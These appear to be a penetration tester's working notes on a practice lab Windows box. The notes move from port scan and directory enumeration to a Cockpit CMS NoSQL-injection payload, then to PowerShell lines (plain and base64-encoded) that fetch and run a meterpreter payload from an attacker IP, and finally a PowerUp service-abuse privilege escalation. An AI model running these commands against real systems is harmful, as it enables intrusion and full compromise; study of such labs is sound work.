10.129.173.59

```
80/tcp open  http    Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/7.4.20)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20
|_http-title: 403 Forbidden
Service Info: Host: localhost
```


Worthy gobuster:

```
/xampp
/phpmyadmin
/webalizer
/aux
/con
/php-cgi/
```



-----------------------------


Using `feroxbuster` and the  raft wordlists from SecLists

I found `/cockpit`


Now trying from here:

https://swarm.ptsecurity.com/rce-cockpit-cms/


I used method #3 

```
{"auth":{"user":{
"$func":"var_dump"
},"password":[
0
]
},"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"}
```

```
string(7) "ricardo"
string(5) "laura"
string(6) "steven"
{"success":false,"error":"User not found"}
```


We can use this chain to get a shell

I do this in my new repo

I use `powershell -enc` to run commands that would have periods/dots in them

(New-Object Net.WebClient).DownloadFile("http://10.10.14.7/met7777.exe","C:\Users\web\AppData\Local\Temp\met7777.exe")


powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANwAvAG0AZQB0ADYANgA2ADYALgBlAHgAZQAiACwAIgBDADoAXABVAHMAZQByAHMAXAB3AGUAYgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAbQBlAHQANgA2ADYANgAuAGUAeABlACIAKQA=

https://raikia.com/tool-powershell-encoder/



Get meterpreter shell -- tried x64



```
load powershell
powershell_shell

IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/PowerUp.ps1")

```


Invoke-ServiceAbuse -Name 'VeyonService' -Command "C:\Users\web\AppData\Local\Temp\shell4444.exe"

need to have it call back to a different port


just listen with netcat